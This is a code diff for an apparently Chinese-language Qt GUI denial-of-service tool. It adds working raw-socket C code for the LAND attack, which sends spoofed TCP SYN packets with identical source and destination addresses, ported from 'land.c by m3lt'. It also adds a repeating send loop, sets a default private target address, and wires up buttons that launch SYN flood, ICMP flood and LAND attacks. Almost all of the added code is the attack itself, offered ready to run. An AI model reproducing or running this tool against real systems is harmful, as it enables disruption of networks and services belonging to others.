@@ -1,5 +1,268 @@
 #include "attack.h"
 
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+
+#pragma pack(1)
+struct pseudo_header    //needed for checksum calculation
+{
+    unsigned int source_address;
+    unsigned int dest_address;
+    unsigned char placeholder;
+    unsigned char protocol;
+    unsigned short tcp_length;
+
+    struct tcphdr tcp;
+};
+#pragma pack()
+
+unsigned short attack::csum(unsigned short *ptr, int nbytes)
+{
+    long sum;
+    unsigned short oddbyte;
+    short answer;
+
+    sum = 0;
+    while (nbytes > 1) {
+      sum += *ptr++;
+      nbytes -= 2;
+    }
+    if (nbytes == 1) {
+      oddbyte = 0;
+      *((u_char*) &oddbyte) = *(u_char*) ptr;
+      sum += oddbyte;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum = sum + (sum >> 16);
+    answer = (short) ~sum;
+
+    return (answer);
+}
+
+void attack::oneland(int socketfd, in_addr_t source, u_int16_t sourcePort,
+        in_addr_t destination, u_int16_t destinationPort)
+{
+    static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = { 0 };
+    bzero(sendBuf, sizeof(sendBuf));
+
+    struct iphdr* ipHeader = (iphdr*) sendBuf;
+    struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr));
+
+    ipHeader->version = 4;
+    ipHeader->ihl = 5;
+
+    ipHeader->tos = 0;
+    ipHeader->tot_len = htons(sizeof(sendBuf));
+
+    ipHeader->id = htons(1);
+    ipHeader->frag_off = 0;
+    ipHeader->ttl = 254;
+    ipHeader->protocol = IPPROTO_TCP;
+    ipHeader->check = 0;
+    ipHeader->saddr = source;
+    ipHeader->daddr = destination;
+
+    ipHeader->check = csum((unsigned short*) ipHeader, ipHeader->ihl * 2);
+
+    //TCP Header
+    tcph->source = htons(sourcePort);
+    tcph->dest = htons(destinationPort);
+    tcph->seq = 0;
+    tcph->ack_seq = 0;
+    tcph->doff = 5; //sizeof(tcphdr)/4
+    tcph->fin = 0;
+    tcph->syn = 1;
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
+    tcph->window = htons(512);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+
+    //tcp header checksum
+    struct pseudo_header pseudoHeader;
+    pseudoHeader.source_address = source;
+    pseudoHeader.dest_address = destination;
+    pseudoHeader.placeholder = 0;
+    pseudoHeader.protocol = IPPROTO_TCP;
+    pseudoHeader.tcp_length = htons(sizeof(tcphdr));
+    memcpy(&pseudoHeader.tcp, tcph, sizeof(struct tcphdr));
+
+    tcph->check = csum((unsigned short*) &pseudoHeader, sizeof(pseudo_header));
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(sourcePort);
+    sin.sin_addr.s_addr = destination;
+
+    ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0,
+            (struct sockaddr *) &sin, sizeof(sin));
+    if (sentLen == -1) {
+        perror("sent error");
+    }
+}
+struct pseudohdr
+{
+        struct in_addr saddr;
+        struct in_addr daddr;
+        u_char zero;
+        u_char protocol;
+        u_short length;
+        struct tcphdr tcpheader;
+};
+u_short checksum(u_short * data,u_short length)
+{
+        register long value;
+        u_short i;
+
+        for(i=0;i<(length>>1);i++)
+                value+=data[i];
+
+        if((length&1)==1)
+                value+=(data[i]<<8);
+
+        value=(value&65535)+(value>>16);
+
+        return(~value);
+}
+
+int attack::dolandex()
+{
+    char ip[128] = "127.0.0.1";
+    QByteArray ba = m_inputIp->text().toLatin1();
+    sprintf(ip, "%s", ba.data());
+    uint16_t port = m_inputPort->text().toInt();
+
+    struct sockaddr_in sin;
+    struct hostent * hoste;
+    int sockfd;
+    char buffer[40];
+    struct iphdr * ipheader=(struct iphdr *) buffer;
+    struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
+    struct pseudohdr pseudoheader;
+
+    fprintf(stderr,"land.c by m3lt, FLC\n");
+
+    bzero(&sin,sizeof(struct sockaddr_in));
+    sin.sin_family=AF_INET;
+
+    if((hoste=gethostbyname(ip))!=NULL)
+            bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
+    else if((sin.sin_addr.s_addr=inet_addr(ip))==-1)
+    {
+            fprintf(stderr,"unknown host %s\n",ip);
+            return(-1);
+    }
+
+    if((sin.sin_port=htons(port))==0)
+    {
+            fprintf(stderr,"unknown port %s\n",m_inputPort->text().toInt());
+            return(-1);
+    }
+
+    if((sockfd=socket(AF_INET,SOCK_RAW,255))==-1)
+    {
+            fprintf(stderr,"couldn't allocate raw socket\n");
+            return(-1);
+    }
+
+    bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
+    ipheader->version=4;
+    ipheader->ihl=sizeof(struct iphdr)/4;
+    ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
+    ipheader->id=htons(0xF1C);
+    ipheader->ttl=255;
+    ipheader->protocol=IPPROTO_TCP;//IP_TCP;
+    ipheader->saddr=sin.sin_addr.s_addr;
+    ipheader->daddr=sin.sin_addr.s_addr;
+
+    tcpheader->th_sport=sin.sin_port;
+    tcpheader->th_dport=sin.sin_port;
+    tcpheader->th_seq=htonl(0xF1C);
+    tcpheader->th_flags=TH_SYN;
+    tcpheader->th_off=sizeof(struct tcphdr)/4;
+    tcpheader->th_win=htons(2048);
+
+    bzero(&pseudoheader,12+sizeof(struct tcphdr));
+    pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
+    pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
+    pseudoheader.protocol=6;
+    pseudoheader.length=htons(sizeof(struct tcphdr));
+    bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
+    tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));
+
+    if(sendto(sockfd,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
+    {
+            fprintf(stderr,"couldn't send packet\n");
+            return(-1);
+    }
+    QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +"landed\n";
+    appendOutput(qmsg);
+
+//    fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);
+
+    ::close(sockfd);
+
+}
+void attack::doland()
+{
+    char ip[128] = "127.0.0.1";
+    uint16_t port = 6888;
+//    if (argc == 1) {
+//        printf("Usage:sf ip port\n");
+//        return -1;
+//    }
+
+//    if (argc > 1) {
+//        sprintf(ip, "%s", argv[1]);
+//    }
+
+//    if (argc > 2) {
+//        port = atoi(argv[2]);
+//    }
+
+    QByteArray ba = m_inputIp->text().toLatin1();
+//    psyn->do_main(ba.data(),m_inputPort->text().toInt());
+    sprintf(ip, "%s", ba.data());
+    port = m_inputPort->text().toInt();
+    //for setsockopt
+    int optval = 1;
+
+    //create a raw socket
+    int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (socketfd == -1) {
+        perror("create socket:");
+        exit(0);
+    }
+    if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
+        perror("create socket:");
+        exit(0);
+    }
+
+    in_addr_t source = inet_addr(ip);//inet_addr("127.0.0.1");
+    in_addr_t destination = inet_addr(ip);
+    u_int16_t sourcePort = 1667;
+    u_int16_t destinationPort = port;
+    while(1) {
+        oneland(socketfd, source, sourcePort++, destination, destinationPort);
+        sourcePort %= 65535;
+        sleep(5);
+    }
+
+}
+
 attack::attack(QWidget *parent) : QWidget(parent)
 {
     // 初始化页面
@@ -34,7 +297,7 @@ void attack::initWidget()
     m_textResult->setFixedSize(680,320);
 
     m_inputIp = new QLineEdit();
-    m_inputIp->setText("127.0.0.1");
+    m_inputIp->setText("172.16.113.56");
     m_inputIp->setFixedSize(100, 24);
 
     m_inputPort = new QLineEdit();
@@ -95,16 +358,16 @@ void attack::syn_flood()
 {
     if(m_buttonSYN->text()=="停止攻击")
     {
+        psyn->set_sig_int();
+
         m_buttonICMP->setEnabled(true);
         m_buttonLAND->setEnabled(true);
         m_buttonSYN->setText("SYN Flood攻击");
-
-        psyn->set_sig_int();
-
         appendOutput("攻击已停止");
 
     }
     else {
+        m_buttonSYN->setText("停止攻击");
         m_buttonICMP->setEnabled(false);
         m_buttonLAND->setEnabled(false);
 
@@ -113,7 +376,6 @@ void attack::syn_flood()
         QByteArray ba = m_inputIp->text().toLatin1();
         psyn->do_main(ba.data(),m_inputPort->text().toInt());
 
-        m_buttonSYN->setText("停止攻击");
 
     }
 
@@ -123,26 +385,22 @@ void attack::icmp_flood()
 {
     if(m_buttonICMP->text()=="停止攻击")
     {
-        m_buttonSYN->setEnabled(true);
-        m_buttonLAND->setEnabled(true);
-        m_buttonICMP->setText("ICMP Flood攻击");
-
         picmp->set_sig_int();
         appendOutput("攻击已停止");
 
+        m_buttonSYN->setEnabled(true);
+        m_buttonLAND->setEnabled(true);
+        m_buttonICMP->setText("ICMP Flood攻击");
     }
     else {
         appendOutput("开始攻击");
 
+        m_buttonICMP->setText("停止攻击");
         m_buttonSYN->setEnabled(false);
         m_buttonLAND->setEnabled(false);
 
-
         QByteArray ba = m_inputIp->text().toLatin1();
-
         picmp->do_main(ba.data());
-        m_buttonICMP->setText("停止攻击");
-
     }
 
 }
@@ -163,13 +421,14 @@ void attack::land()
     else {
         appendOutput("开始攻击");
 
+        m_buttonLAND->setText("停止攻击");
         m_buttonSYN->setEnabled(false);
         m_buttonICMP->setEnabled(false);
 
 
         QByteArray ba = m_inputIp->text().toLatin1();
 //        psyn->do_main(ba.data(),m_inputPort->text().toInt());
-        m_buttonLAND->setText("停止攻击");
+        dolandex();
 
     }
 
